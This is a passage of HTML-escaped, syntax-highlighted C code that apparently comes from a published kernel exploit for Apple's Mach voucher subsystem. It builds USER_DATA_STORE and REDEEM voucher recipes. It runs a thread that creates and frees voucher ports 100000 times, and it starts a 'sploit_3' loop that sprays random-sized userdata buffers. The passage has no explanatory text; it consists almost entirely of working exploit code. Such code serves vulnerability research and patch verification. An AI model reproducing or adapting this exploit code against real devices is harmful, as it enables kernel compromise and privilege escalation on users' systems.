class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;create_single_variable_userdata_then_redeem_voucher_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;size_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;template_size_out&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;2&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;))&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_buf &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;uint8_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)+&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_buf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe2 &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content_buf &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe2&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; recipe2&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;template_size_out &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_template_meta &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_template_meta single_recipe_template &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_template_meta redeem_recipe_template &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{};&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;int&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iter_limit &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;100000&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;arg&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_template_meta&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;template&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;recipe_template_meta&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;arg&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;for&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;int&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iter_limit&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_port_t voucher_port &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;create_voucher_from_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_port_deallocate&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_task_self&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(),&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;voucher_port&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;sploit_3&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;()&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;while&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;// choose a userdata size:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint32_t userdata_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;arc4random&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;()&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;%&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;2040&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)+&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;8&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; userdata_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;7&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; userdata_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(~&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;7&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c16"&gt;&amp;quot;userdata size: 0x%x\n&amp;quot;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;userdata_buffer &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;userdata_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;uint32_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;userdata_buffer&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;arc4random&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;((&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;uint32_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;userdata_buffer&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;arc4random&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 